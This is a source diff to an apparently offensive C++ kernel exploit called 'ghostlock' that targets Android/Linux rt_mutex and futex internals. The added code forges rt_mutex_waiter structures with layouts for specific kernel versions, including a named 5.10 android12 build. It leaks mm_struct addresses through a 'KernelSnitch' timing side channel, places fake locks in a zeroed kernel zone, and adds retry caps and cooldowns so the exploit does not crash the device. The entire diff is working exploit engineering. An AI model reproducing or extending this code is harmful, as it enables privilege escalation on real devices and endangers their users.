@@ -397,8 +397,18 @@ namespace ghostlock::support {
                     *request, write_layout);
                 put64(p, kernel::W0_OFF + 0x30, waiter_task); /* task */
                 put64(p, kernel::W0_OFF + 0x38, (session::g_exploit_session.heap.current.fake_lock)); /* lock */
-                put32(p, kernel::W0_OFF + 0x40, 0); /* wake_state */
-                put32(p, kernel::W0_OFF + 0x44, kernel::FAKE_WAITER_PRIO); /* prio */
+                if (session::g_exploit_session.profile.effective_compact_waiter() == 2) {
+                    /* 5.10 legacy rt_mutex_waiter (SO-54C 5.10.236-android12-9,
+                     * layout.json-derived and device-proven): no wake_state.
+                     * tree(0x00) pi_tree(0x18) task(0x30) lock(0x38) prio(0x40)
+                     * deadline(0x48), sizeof=0x50; +0x44 is padding. */
+                    put32(p, kernel::W0_OFF + 0x40, kernel::FAKE_WAITER_PRIO); /* prio */
+                    put32(p, kernel::W0_OFF + 0x44, 0); /* padding */
+                } else {
+                    /* 5.14+/6.1 compact: wake_state rides +0x40, prio +0x44. */
+                    put32(p, kernel::W0_OFF + 0x40, 0); /* wake_state */
+                    put32(p, kernel::W0_OFF + 0x44, kernel::FAKE_WAITER_PRIO); /* prio */
+                }
                 put64(p, kernel::W0_OFF + 0x48, 0); /* deadline */
                 put64(p, kernel::W0_OFF + 0x50, 0); /* ww_ctx */
             } else {
@@ -474,6 +484,39 @@ namespace ghostlock::support {
      * syscall-level fault-injection framework; the ownership refactor itself is
      * complete (CPP12h). Completion: add the framework, cover the early-exit
      * paths, then delete this comment and the residual row. */
+    /* v11.3: avalanche guard state. The 2026-10-02 23:12 run burned 7
+     * back-to-back KernelSnitch mm-leak scans (~10s each, zero gap between
+     * attempts) and took the system down at ~78s (killProcesses + init
+     * SIGABRT). Cooldown between failed attempts plus a hard cap on the
+     * consecutive mm-leak failure streak keeps the retry loop from
+     * re-creating that. */
+    static int32_t g_mm_leak_fail_streak = 0;
+
+    /* v13: deterministic fake-lock slots in the CLI-verified safe zero zone
+     * (target::zero_lock). The select route stamps waiter->lock here instead of
+     * the sprayed payload page: a zeroed slot makes the whole adjust_prio_chain
+     * aftermath deterministic ([7] requeue = insert-as-black-root on the empty
+     * tree, [9] owner==NULL exits) — the v12.12 pstore panic was the requeue
+     * descent wandering a payload page whose content is only a page-recycling
+     * gamble (base = leaked-mm page; if the gamble loses, the planted W0 root
+     * is not there and rb_insert_color walks live slab/zeroed data). Bank is
+     * keyed by pid: a restarted process must not replay slots its predecessor
+     * already dirtied (a dirty slot's root is a dead stack VA). */
+    uintptr_t next_zero_lock_slot(void) {
+        static uint32_t zero_lock_use_count = 0;
+        const uintptr_t bank =
+            static_cast<uintptr_t>(getpid()) % static_cast<uintptr_t>(target::zero_lock::kBankCount);
+        const uintptr_t index =
+            static_cast<uintptr_t>(zero_lock_use_count++) %
+            static_cast<uintptr_t>(target::zero_lock::kSlotsPerBank);
+        const uintptr_t slot = target::zero_lock::kZoneBase +
+                               bank * target::zero_lock::kBankStride +
+                               index * target::zero_lock::kSlotStride;
+        pr_info("[zerolock] slot bank=%zu index=%zu addr=0x%016zx\n",
+                static_cast<size_t>(bank), static_cast<size_t>(index), slot);
+        return slot;
+    }
+
     uintptr_t prepare_kernel_page(const memory::WriteRequest *request) {
         struct timespec t_spray;
         clock_gettime(CLOCK_MONOTONIC, &t_spray);
@@ -572,11 +615,15 @@ namespace ghostlock::support {
                     if (scan_done > scan_total) scan_done = scan_total;
                     size_t scan_id = (scan_done * 4096) | ((scan_done * 8) % 4096);
                     if (scan_id > static_cast<size_t>FUTEX_SZ) scan_id = static_cast<size_t>FUTEX_SZ;
+                    /* v11.4: mm_probe != 0 means the mm brute-force pass is
+                     * running (collision phase leaves it at 0); without this
+                     * the parent beat could not tell the two phases apart. */
                     pr_info("[spray]   still finding collisions (%llds) %zu%% "
-                            "(futex 0x%zx/0x%zx)...\n",
+                            "(futex 0x%zx/0x%zx mm_probe=0x%zx)...\n",
                             waited / 1000,
                             scan_total ? scan_done * 100 / scan_total : 0,
-                            scan_id, (size_t) FUTEX_SZ);
+                            scan_id, (size_t) FUTEX_SZ,
+                            static_cast<size_t>(ks->mm_progress));
                     last_beat = waited;
                 }
                 usleep(50000);
@@ -588,6 +635,10 @@ namespace ghostlock::support {
         }
         if (!snitch.has_collisions()) {
             pr_warning("[spray] futex collisions not found\n");
+            /* v11.4: collision-failure attempts also run the full timing scan;
+             * count them into the same consecutive-failure streak as mm-leak
+             * failures so a noisy system cannot loop scans without end. */
+            g_mm_leak_fail_streak++;
             snitch.reset();
             for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
                 kill_child(prepare_ctx.childs[i]);
@@ -610,6 +661,7 @@ namespace ghostlock::support {
             leaked < kernel::KERNELSNITCH_IDENTITY_START ||
             leaked >= kernel::g_direct_map_end) {
             pr_warning("KernelSnitch mm_struct leak failed\n");
+            g_mm_leak_fail_streak++;
             snitch.reset();
             for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
                 kill_child(prepare_ctx.childs[i]);
@@ -716,6 +768,7 @@ namespace ghostlock::support {
         for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
             uintptr_t base = prepare_kernel_page(&request);
             if (base) {
+                g_mm_leak_fail_streak = 0;
                 memory::PayloadWriteLayout layout = {
                     .parent = (session::g_exploit_session.heap.current.fake_parent),
                     .right = (session::g_exploit_session.heap.current.fake_right),
@@ -741,8 +794,24 @@ namespace ghostlock::support {
                 pr_warning("prepare_kernel_page timeout after %u attempts\n", attempt);
                 break;
             }
-            pr_warning("prepare_kernel_page retry %u/%u +%lldms\n", attempt,
-                       max_attempts, ms_since(&t_good));
+            /* v11.3/v11.4: each failed attempt costs a full ~10s kernelsnitch
+             * scan (collision discovery and/or mm brute force); seven zero-gap
+             * cycles matched the 23:13:44 system avalanche exactly. The streak
+             * covers both failure kinds; cap it and cool down before the next
+             * scan. v11.7: 6 -> 10. Every attempt now runs with the 2s cooldown
+             * below (the 23:13:44 avalanche was zero-gap), the v11.5 agreement
+             * gate discards poisoned sets before they reach the mm scan, and
+             * the 2026-10-03 12:33 run burned 3 of 6 attempts on discarded
+             * sets alone — at the ~1/3 per-scan leak rate, 6 scans leave
+             * ~9% all-miss odds while 10 leave ~1.7%. */
+            if (g_mm_leak_fail_streak >= 10) {
+                pr_warning("kernelsnitch failed %d consecutive attempts; stopping prepare "
+                           "to avoid futex residue avalanche\n", g_mm_leak_fail_streak);
+                break;
+            }
+            pr_warning("prepare_kernel_page retry %u/%u +%lldms (streak=%d, cooldown 2s)\n",
+                       attempt, max_attempts, ms_since(&t_good), g_mm_leak_fail_streak);
+            usleep(2000000);
         }
         return 0;
     }
